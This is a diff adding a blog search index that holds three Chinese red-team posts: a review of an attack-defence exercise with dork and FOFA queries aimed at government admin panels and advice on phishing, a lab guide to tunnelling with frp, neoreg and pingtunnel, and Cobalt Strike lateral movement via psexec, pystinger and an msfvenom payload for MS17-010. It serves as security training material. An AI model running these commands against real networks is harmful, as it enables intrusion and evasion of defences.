@@ -1,0 +1,82 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>hw复盘</title>
+      <link href="/2021/07/29/3/"/>
+      <url>/2021/07/29/3/</url>
+      
+        <content type="html"><![CDATA[<h2 id="一、个人能力刨析-技术沉淀"><a href="#一、个人能力刨析-技术沉淀" class="headerlink" title="一、个人能力刨析(技术沉淀)"></a>一、个人能力刨析(技术沉淀)</h2><h3 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h3><p>a．不足：依赖于goby(发现框架指纹)，xray(发现后台目录和sql注入)等扫描器。缺点：ip非常容易被封锁；频繁切换代理导致测试效率大大降低；飞鱼ip网速不稳定。可以购买短期的或按流量计费的vps,或自己维护一个代理池</p><p>b. 谷歌语法之前没有仔细研究，通过这次hw，试着使用了一下谷歌语法，确实能发现一些fofa上面没有收录的资产</p><p>c.谷歌语法批量采集工具，fofa采集工具,将资产格式化输出，然后筛选出OA，cms，后台，未授权等资产。</p><pre><code>site:xxx.xxx inurl:login | inurl:admin | inurl:system | intitle:登陆 | intitle:后台 | intitle:管理 | intitle:认证 | intitle:系统</code></pre><p>d.拿到目标，先看看给出的url里面有没有shiro、nday，优先快速获取权限并做好权限维持。</p><p> 对目标资产进行分级：金融类的最后看或可以放弃，政府事业单位其次，优先企业</p><p>e.对于政府事业单位，涉及“厅”，“局”。不要到一个单位上面死磕，可以把目标扩大到全省，用fofa进行大范围搜索找oa，shiro，后台：</p><pre><code>region=&quot;Shandong&quot; &amp;&amp; (body=&quot;自然资源&quot; &amp;&amp; (title=&quot;管理&quot; || title=&quot;系统&quot; || title=&quot;后台&quot;)) &amp;&amp; country=&quot;CN&quot;region=&quot;&quot;Shangdong&quot; &amp;&amp; (tile=&quot;厅&quot; || tile=&quot;局&quot;) &amp;&amp; app=&quot;Landray-OA系统&quot;</code></pre><h3 id="2-技术沉淀"><a href="#2-技术沉淀" class="headerlink" title="2.技术沉淀"></a>2.技术沉淀</h3><p>a.准备各类漏洞的exp。平时对hw爆出的、最新的、经典的漏洞进行复现，在复现完毕后。尽量能收集或自己编写对此漏洞exp脚本，脚本可以很快速进行漏洞验证和getshell，省略了去用burp构造数据包的时间。(不能快速利用，容易影响心态)</p><p>b.收集0day，1day，nday，慢慢沉淀</p><p>c. 常见编辑器漏洞；二开thinkphp，在这几次hw都有遇到，需要复现研究底层代码。</p><p>d.当没有框架的时候，如何getshell需要个人对于owasp top10这一类的漏洞的深刻理解，组合利用。弱口令或爆破(形成自己一套好用的字典)，进后台，找上传(解析，截断，绕过)</p><p>e.各类漏洞利用工具保持免杀，发掘好的项目，拓展思路，对同一种漏洞，收集多个不同的工具，做横向对比，匹配出各个场景下面哪一个适用度最高(外网，内网)</p><p>f.政府事业单位或银行，静态页面打不了，钓鱼是一个突破口，能保证在hw中可以使用。</p><p>g.行业特性研究，比如学校该怎么打(sso)，医院该怎么打(自助机近员)，事业单位该怎么打。</p><h2 id="二、规则报告刨析-团队合作"><a href="#二、规则报告刨析-团队合作" class="headerlink" title="二、规则报告刨析(团队合作)"></a>二、规则报告刨析(团队合作)</h2><p>  a.拿到目标后，一个队员来对目标资产格式化，输出到execl表里面，并建立协同文档。磨刀不误砍柴功。</p><p>  b.如果规则上面没用明确表示攻击下属、直属、和控股是否得分，需提前和裁判沟通，避免把下属内网打穿了，最后一分不给，浪费时间和精力。(或者需证明下属能通到目标)</p><p>c.如果敏感数据可以单独算分，测试过程中需将敏感数据的内容和条目数给截图。拿到数据库，利用适当的SQL语法，可以获取敏感信息和数量。</p><p>d.开启录屏，如果一些操作没有截上图(对面关站了)，后面在录屏里面找。</p><p>e.将自己的exp、漏洞文库、goby_exp、cs、远控等工具单独考出在一个硬盘中，避免现场不让使用自己电脑，可以给裁判审批后使用，防患于未然。</p><p>f.报告提交时需把攻击路径、渗透结果总结汇总写清楚，便于裁判给分。 </p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 红队攻防 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 碎碎念 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>多级代理</title>
+      <link href="/2021/07/29/2/"/>
+      <url>/2021/07/29/2/</url>
+      
+        <content type="html"><![CDATA[<h2 id="一-端口转发-netsh"><a href="#一-端口转发-netsh" class="headerlink" title="一.端口转发(netsh)"></a>一.端口转发(netsh)</h2><p>1.<strong>实验目的：端口转发把本机rdp端口转发到9000端口，并连接</strong></p><p>2.实验环境：win7 ip:192.168.93.130</p><p>3.实验步骤：</p><pre class="line-numbers language-json"><code class="language-json">netsh interface portproxy add v4tov4 listenaddress=<span class="token number">192.168</span>.<span class="token number">93.130</span> listenport=<span class="token number">9000</span> connectaddress=<span class="token number">192.168</span>.<span class="token number">93.130</span> connectport=<span class="token number">3389</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/07/29/2/image-20210711120831147.png" alt></p><p><img src="/2021/07/29/2/image-20210729184835509.png" alt></p><h2 id="二-正向代理-neoreg-py"><a href="#二-正向代理-neoreg-py" class="headerlink" title="二.正向代理(neoreg.py)"></a>二.正向代理(neoreg.py)</h2><p>1.实验目的：正向代理(neo-reg)</p><p>2.实验环境：win7 ip:192.168.93.130 开启apache服务，用neo-reg做正向代理</p><p>3.实验步骤：</p><p>1）上传脚本到服务器</p><p><img src="/2021/07/29/2/clipboard-1615731685787.png" alt></p><p>2）运行py</p><pre class="line-numbers language-json"><code class="language-json">neoreg.py  -k  key  -u  url <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/07/29/2/clipboard-1615731714077.png" alt></p><p>3）用Proxifier进行代理</p><p><img src="/2021/07/29/2/clipboard-1615731685788.png" alt></p><h2 id="三-反向代理-frp"><a href="#三-反向代理-frp" class="headerlink" title="三.反向代理(frp)"></a>三.反向代理(frp)</h2><p>1.实验目的：frp反向代理</p><p>2..实验环境：</p><p>虚拟机作为vps，ip：xx.xx.xx.xx 。</p><p>物理机（另一台虚拟机）作为客户端 ip:192.169.93.130，配置反向代理，使用工具测试连通性</p><p>3.实验步骤：</p><p>1）vps上面运行 </p><pre><code>./frps  -c ./frps.ini</code></pre><p>2）client上面运行 </p><pre><code>frpc.exe -c frpc.ini</code></pre><h2 id="四-ICMP隧道-pingtunnel"><a href="#四-ICMP隧道-pingtunnel" class="headerlink" title="四.ICMP隧道(pingtunnel)"></a>四.ICMP隧道(pingtunnel)</h2><p>pingtunnel是把tcp/udp/sock5流量伪装为icmp流量进行转发的工具</p><p>1.实验环境：</p><p>icmp隧道,vps作为服务端，ip: xx.xx.xx.xx</p><p>物理机（另一台虚拟机）作为客户端，配置icmp隧道，使用工具测试连通性</p><p>2.实验步骤：</p><pre><code>vps上配置frp服务端vps上配置pingtunnel服务端被控服务器上启动pingtunnel客户端，指定本地监听端口，远程frp服务去监听端口被控服务器上启动frp客户端，端口指向pingtunnel监听的本地端口</code></pre><p>1）vps上配置frp服务端</p><p><img src="/2021/07/29/2/image-20210711121145946.png" alt></p><p>frps.ini配置如下</p><p><img src="/2021/07/29/2/clipboard-1615732424142.png" alt></p><p>2）vps上配置pingtunnel服务端</p><p><img src="/2021/07/29/2/image-20210711121207276.png" alt></p><p>3）控服务器上启动pingtunnel客户端，指定本地监听端口，远程frp服务去监听端口</p><p><img src="/2021/07/29/2/image-20210729164315590.png" alt></p><p>4）被控服务器上启动frp客户端，端口指向pingtunnel监听的本地端口</p><p><img src="/2021/07/29/2/image-20210711121301966.png" alt></p><p>frpc,ini配置如下</p><p><img src="/2021/07/29/2/clipboard-1615732367323.png" alt></p><p><img src="/2021/07/29/2/image-20210729164402274.png" alt></p><h2 id="五-端口复用-protoplex"><a href="#五-端口复用-protoplex" class="headerlink" title="五.端口复用(protoplex)"></a>五.端口复用(protoplex)</h2><p>1.复用方案：</p><p>1）用protoplex监听9999做分流</p><p>2）将web端口流量转发到9999端口</p><pre class="line-numbers language-json"><code class="language-json">netsh interface portproxy add v4tov4 listenaddress=<span class="token number">192.168</span>.<span class="token number">5.130</span> listenport=<span class="token number">80</span> connectport=<span class="token number">9999</span> connectaddress=<span class="token number">192.168</span>.<span class="token number">5.130</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）本地起socks服务端1080</p><pre class="line-numbers language-json"><code class="language-json">ew -s ssocksd -l <span class="token number">1080</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）如果协议头是http就转回80，如果是socks，就转到socks监听端口</p><pre class="line-numbers language-json"><code class="language-json">protoplex.exe --socks5 <span class="token number">192.168</span>.<span class="token number">130.5</span><span class="token operator">:</span><span class="token number">1080</span> --http <span class="token number">127.0</span>.<span class="token number">0.1</span><span class="token operator">:</span><span class="token number">80</span> -b <span class="token number">192.168</span>.<span class="token number">130.5</span><span class="token operator">:</span><span class="token number">9999</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.实验环境：win7 ip：192.168.130.5</p><p>3.实验步骤：</p><p>1）端口复用</p><p>2）ew开启正向连接</p><p><img src="/2021/07/29/2/clipboard-1615733134975.png" alt></p><p>3）执行protoplex分流</p><p><img src="/2021/07/29/2/clipboard-1615733152038.png" alt></p><p>4）Proxifier连接192.168.93.130的80端口的socks5可以成功，</p><p><img src="/2021/07/29/2/image-20210314224719674.png" alt></p><p>5）80的业务可以访问。即实现了80端口复用</p><p><img src="/2021/07/29/2/clipboard-1615733255510.png" alt></p><h2 id="六-多级代理"><a href="#六-多级代理" class="headerlink" title="六.多级代理"></a>六.多级代理</h2><p>两个人一组，共四台机器，虚拟机均使用NAT模式</p><p>甲同学的虚拟机作为攻击机器，甲同学的物理机作为vps</p><p>乙同学的物理机作为web服务器，乙同学的虚拟机作为业务服务器</p><p>搭建多级代理</p><p>1.实验环境</p><p><img src="/2021/07/29/2/clipboard-1615733293491.png" alt></p><p>2.配置方法</p><p><img src="/2021/07/29/2/clipboard-1615733326942.png" alt></p><p><img src="/2021/07/29/2/clipboard-1615733336824.png" alt></p><p>3.实验步骤</p><p>1）公网vps</p><p>frps</p><p><img src="/2021/07/29/2/clipboard-1615733364109.png" alt></p><p>2）win7 web</p><p>frps</p><p><img src="/2021/07/29/2/clipboard-1615733497224.png" alt></p><p>frps.ini</p><p><img src="/2021/07/29/2/clipboard-1615733511199.png" alt></p><p>frpc</p><p><img src="/2021/07/29/2/clipboard-1615733522545.png" alt></p><p>frpc.ini</p><p><img src="/2021/07/29/2/clipboard-1615733533766.png" alt></p><p>3.server08业务</p><p>frpc</p><p><img src="/2021/07/29/2/clipboard-1615733587043.png" alt></p><p>frpc.ini</p><p><img src="/2021/07/29/2/clipboard-1615733597437.png" alt></p><p>代理测试</p><p><img src="/2021/07/29/2/clipboard-1615733611837.png" alt></p><p>server08不出网</p><p><img src="/2021/07/29/2/clipboard-1615733622295.png" alt></p><p>经过多级代理，可以出网</p><p><img src="/2021/07/29/2/image-20210314225409332.png" alt></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 内网渗透 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 代理 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>不出网主机上线cs</title>
+      <link href="/2021/07/29/1/"/>
+      <url>/2021/07/29/1/</url>
+      
+        <content type="html"><![CDATA[<p>环境搭建</p><p>业务服务器192.168.93.100不出网</p><p>web服务器密码：administrator/123.com</p><p>业务服务器密码：administrator/123.com</p><p><img src="/2021/07/29/1/image-20210319131316572.png" alt></p><h2 id="SMB-beacon"><a href="#SMB-beacon" class="headerlink" title="SMB beacon"></a>SMB beacon</h2><p>​    此流量封装在SMB协议中，所以SMB beacon相对隐蔽。SMB beacon不能直接生成可用载荷, 只能使用 PsExec 或 Stageless Payload 上线。</p><p>​    首先得到内网中一台主机的beacon，抓取密码。探测内网网段那些主机开放445端口。</p><p>​    如果知道内网主机administrator的账号和密码，在目标机器不出网的情况下，可以使用Smb beacon使目标主机上线（利用这种beacon横移必须有目标主机的管理员权限或者说是拥有具有管理员权限的凭据）</p><h3 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h3><p>1.web服务器cs上线，抓取密码</p><p>2.探测内网网段其它主机，端口扫描445等端口，使用imcp协议</p><p><img src="/2021/07/29/1/image-20210319132511254.png" alt></p><p>发现内网其它主机ip：192.168.93.100</p><p><img src="/2021/07/29/1/image-20210319132536369.png" alt></p><p>3.建立listener，选择SMB beacon</p><p><img src="/2021/07/29/1/image-20210319134542196.png" alt></p><p>5.在cs中使用psexec进行横向移动，选择现有的beacon作为跳板，这里凭据必须是administrator ，即拥有目标主机管理员权限</p><p><img src="/2021/07/29/1/image-20210319134640149.png" alt></p><p><img src="/2021/07/29/1/image-20210319134739036.png" alt></p><p>6.连接成功，可以看到smb beacon上线的主机右侧有∞∞标识</p><p><img src="/2021/07/29/1/image-20210319134852307.png" alt></p><p>可以看到业务主机（ip：192.168.93.100）的端口连接情况，他开发445端口连接web服务器（ip：192.168.93.200）</p><p><img src="/2021/07/29/1/image-20210319135113064.png" alt></p><h2 id="中转Listener"><a href="#中转Listener" class="headerlink" title="中转Listener"></a>中转Listener</h2><p>1.web服务器beacon下建立Listener监听器</p><p><img src="/2021/07/29/1/image-20210319135639516.png" alt></p><p><img src="/2021/07/29/1/image-20210319135738279.png" alt></p><p>2、发现内网主机且知道账号密码,psexec横向传递，选择中转listener</p><p><img src="/2021/07/29/1/image-20210319135814153.png" alt></p><p>3.业务服务器目标上线</p><p><img src="/2021/07/29/1/image-20210319135937136.png" alt></p><p>4.查看业务服务器端口连接情况</p><p><img src="/2021/07/29/1/image-20210319140021653.png" alt></p><h2 id="配置listener通过HTTP代理上线-goproxy"><a href="#配置listener通过HTTP代理上线-goproxy" class="headerlink" title="配置listener通过HTTP代理上线(goproxy)"></a>配置listener通过HTTP代理上线(goproxy)</h2><p>1.上传proxy.exe到web服务器，在8080端口开启http代理</p><pre><code>C:\proxy.exe http -t tcp -p &quot;0.0.0.0:8080&quot; --daemon</code></pre><p>2.用netsh命令把外网ip的8080端口转发到内网ip的192.168.93.200的822端口(必须为未使用的端口，否则会失败),web服务器的80端口被占用，不能使用</p><pre><code>netsh interface portproxy add v4tov4 listenaddress=192.168.93.200 listenport=822 connectaddress=192.168.1.188 connectport=8080</code></pre><p>3.创建listener，配置如下</p><p><img src="/2021/07/29/1/image-20210319172659688.png" alt></p><p>4.生成stageless payload，在业务服务器上执行，成功上线</p><p><img src="/2021/07/29/1/image-20210319172844938.png" alt></p><p>连接过程</p><pre><code>192.168.93.100  → 192.168.93.200:822→ 192.168.1.188:8080→ C2</code></pre><h2 id="使用pystinger搭建socks4代理"><a href="#使用pystinger搭建socks4代理" class="headerlink" title="使用pystinger搭建socks4代理"></a>使用pystinger搭建socks4代理</h2><p>盗一张图：</p><p><img src="/2021/07/29/1/image-20210719105024898.png" alt></p><p>1.上传proxy.php到WEB服务器网站目录，正常访问返回UTF-8</p><p>这里换了ip，web服务器外网ip为192.168.43.101</p><p><img src="/2021/07/29/1/image-20210319200247151.png" alt></p><p>上传stinger_server.exe，执行</p><pre><code>start stinger_server.exe 0.0.0.0</code></pre><p>Kali(VPS)上执行</p><pre><code>./stinger_client -w http://192.168.43.101/proxy.php -l 127.0.0.1 -p 60000</code></pre><p>此时已经将web服务器的60020端口转发到vps的60020端口上了</p><p><img src="/2021/07/29/1/image-20210319200551056.png" alt></p><p>cs中新建listener，ip填写web服务器内网ip：192.168.93.200，60020为转发端口</p><p><img src="/2021/07/29/1/image-20210319200748267.png" alt></p><p>使用psexec横向移动，选择listener为stinger，业务内网主机ip：192.168.93.100成功上线</p><p><img src="/2021/07/29/1/image-20210319200812123.png" alt></p><h2 id="web主机-边缘机器-不出网解决办法"><a href="#web主机-边缘机器-不出网解决办法" class="headerlink" title="web主机(边缘机器)不出网解决办法"></a>web主机(边缘机器)不出网解决办法</h2><p>web主机ip：192.168.93.100</p><p>上传stinger_server.exe在web机器，执行</p><pre><code>start stinger_server.exe 0.0.0.0</code></pre><p>Kali(VPS)上执行</p><pre><code>./stinger_client -w http://192.168.93.100/proxy.php -l 0.0.0.0 -p 60000</code></pre><p>此时已经将web服务器的60020端口转发到vps的60020端口上了</p><p><img src="/2021/07/29/1/image-20210319202924156.png" alt></p><p>cs中新建listener，ip填写web服务器内网ip：192.168.93.100，60020为转发端口</p><p><img src="/2021/07/29/1/image-20210319203045240.png" alt></p><p>运行木马，vps上面已经显示连接，主机上线</p><p><img src="/2021/07/29/1/image-20210319202859552.png" alt></p><p><img src="/2021/07/29/1/image-20210319202839356.png" alt></p><h2 id="业务主机-MS17-010-不出网上线cs"><a href="#业务主机-MS17-010-不出网上线cs" class="headerlink" title="业务主机(MS17_010)不出网上线cs"></a><strong>业务主机</strong>(MS17_010)不出网上线cs</h2><p>1.继续使用pystinger搭建socks4代理</p><p><img src="/2021/07/29/1/image-20210325225356980.png" alt></p><p>2.使用msf把bin转为dll格式</p><pre><code>msfvenom -p generic/custom PAYLOADFILE=./payload.bin -a x64 --platform windows -f dll -o x64.dll </code></pre><p><img src="/2021/07/29/1/image-20210325225435733.png" alt></p><p>3.替换目录下原有的x64.dll文件</p><p><img src="/2021/07/29/1/image-20210325225514247.png" alt></p><p>4.利用方程式漏洞工具攻击不出网的ms17_010主机，成功上线</p><p><img src="/2021/07/29/1/image-20210325225553202.png" alt></p><p><img src="/2021/07/29/1/image-20210325225616687.png" alt></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 内网渗透 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CobaltStrike </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
